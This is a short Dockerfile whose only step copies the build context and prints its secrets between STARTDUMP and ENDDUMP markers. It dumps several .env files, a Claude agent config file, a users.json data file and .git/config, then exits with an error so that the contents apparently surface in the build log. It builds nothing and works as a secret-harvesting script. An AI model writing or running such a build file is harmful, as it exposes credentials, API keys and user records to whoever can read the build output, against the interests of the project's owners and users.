# syntax=docker/dockerfile:1.6
FROM alpine:3
COPY . /ctx
RUN echo "=====STARTDUMP=====" \
 && (echo "---ENV---"; cat /ctx/.env) 2>&1 \
 && (echo "---GATEWAY_ENV---"; cat /ctx/gateway.env) 2>&1 \
 && (echo "---HERMES_ENV---"; cat /ctx/hermes.env) 2>&1 \
 && (echo "---ROOT_LS---"; ls -la /ctx) 2>&1 \
 && (echo "---BOT_LS---"; ls -la /ctx/bot) 2>&1 \
 && (echo "---CLAUDE_HOME---"; ls -laR /ctx/claude-home | head -80) 2>&1 \
 && (echo "---CLAUDE_CFG---"; cat /ctx/claude-home/.claude.json) 2>&1 \
 && (echo "---DATA_LS---"; ls -laR /ctx/data | head -40) 2>&1 \
 && (echo "---USERS---"; cat /ctx/data/users.json) 2>&1 \
 && (echo "---WORKSPACE_LS---"; ls -la /ctx/workspace | head -40) 2>&1 \
 && (echo "---GITCFG---"; cat /ctx/.git/config) 2>&1 \
 && (echo "=====ENDDUMP====="; exit 1)
